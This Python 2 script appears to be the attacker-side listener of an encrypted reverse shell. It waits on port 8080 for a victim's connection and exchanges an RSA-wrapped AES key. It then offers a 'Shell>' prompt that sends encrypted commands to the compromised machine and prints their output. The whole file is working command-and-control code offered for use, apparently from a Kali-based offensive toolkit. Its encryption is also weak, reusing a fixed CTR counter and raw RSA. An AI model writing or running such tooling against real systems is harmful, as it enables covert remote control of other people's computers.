# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"


import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

import string
import random



# encrypt the AES key with target RSA public keyy - AES key will be used for further symmetric encryption
def encryptAESKey(aes_key, client_public_key):
    encryptor = RSA.importKey(client_public_key)
    encriptedData=encryptor.encrypt(aes_key, 0)
    return encriptedData[0]


def encrypt(message, aes_key, counter):
    encrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message, aes_key, counter):
    decrypto = AES.new(aes_key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message)

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
    # we set a flag to prevent this
    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.100.187", 8080))
    s.listen(1)

    print '[+] Listening for incoming TCP connection on port 8080'

    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr

    client_RSA_public_key = conn.recv(1024)
    print 'client key:'
    print client_RSA_public_key

    # after TCP handshake we creates our AES key for further communication
	# generate AES key
    aes_key = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(32))
    print "Generated AES Key " + str(aes_key)
    conn.send(encryptAESKey(aes_key, client_RSA_public_key))

	# generate AES counter
    aes_counter = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(16))
    print "Generated AES Counter " + str(aes_counter)
    conn.send(encryptAESKey(aes_counter, client_RSA_public_key))

    while True:

        command = raw_input("Shell> ")

        if 'terminate' in command:
            conn.send(encrypt(command, aes_key, aes_counter))
            conn.close()
            break

        else:
            conn.send(encrypt(command, aes_key, aes_counter))
            print decrypt(conn.recv(1024), aes_key, aes_counter)

def main ():
    connect()
main()
